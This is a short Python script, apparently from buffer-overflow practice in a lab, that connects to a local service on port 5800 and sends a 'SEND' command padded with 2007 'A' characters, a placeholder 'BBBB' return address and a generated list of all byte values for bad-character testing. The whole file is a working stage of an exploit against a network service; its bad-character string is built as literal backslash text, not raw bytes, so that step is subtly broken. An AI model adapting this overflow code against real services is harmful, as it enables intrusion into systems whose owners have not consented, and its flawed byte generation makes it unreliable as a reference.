import socket

IP = "127.0.0.1"
PORT = 5800


def generate_all_bytes():
    
    chars = []
    for i in range(0, 256):
        # print(f"\\x{i:02x}", end="")
        chars.append(f"\\x{i:02x}")
    return "".join(chars)
    
    
if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    
    eip = "BBBB"
    badchars = generate_all_bytes()
    payload = "A" * 2007 + eip + badchars
    s.send(f"SEND {payload} \r\n".encode())
    s.recv(1024)
    